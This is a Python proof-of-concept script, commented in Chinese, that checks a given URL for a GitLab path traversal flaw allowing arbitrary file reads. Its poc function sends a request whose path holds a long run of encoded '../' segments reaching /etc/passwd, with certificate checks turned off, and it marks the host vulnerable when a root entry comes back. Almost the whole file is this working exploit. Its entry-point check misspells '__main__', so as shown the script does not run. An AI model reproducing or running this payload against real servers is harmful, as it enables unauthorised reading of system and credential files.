#导包
import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """"
  ______ _ _                           _ _             
 |  ____(_) |                         | (_)            
 | |__   _| | ___   _ __ ___  __ _  __| |_ _ __   __ _ 
 |  __| | | |/ _ \ | '__/ _ \/ _` |/ _` | | '_ \ / _` |
 | |    | | |  __/ | | |  __/ (_| | (_| | | | | | (_| |
 |_|    |_|_|\___| |_|  \___|\__,_|\__,_|_|_| |_|\__, |
                                                  __/ |
                                                 |___/ 


"""
    print(test)


#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='gitlab路径遍历读取任意文件漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/group1/group2/group3/group4/group5/group6/group7/group8/group9/project9/uploads/4e02c376ac758e162ec674399741e38d//..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
    res = requests.get(url=target + payload,verify=False)
    if res.status_code ==200 and '0:0' in res.text:
        print(f'[+]{target}存在漏洞')
    else:
        print(f'[+]{target}不存在漏洞')
    

    

#函数入口
if __name__ =='___main__':
    main()
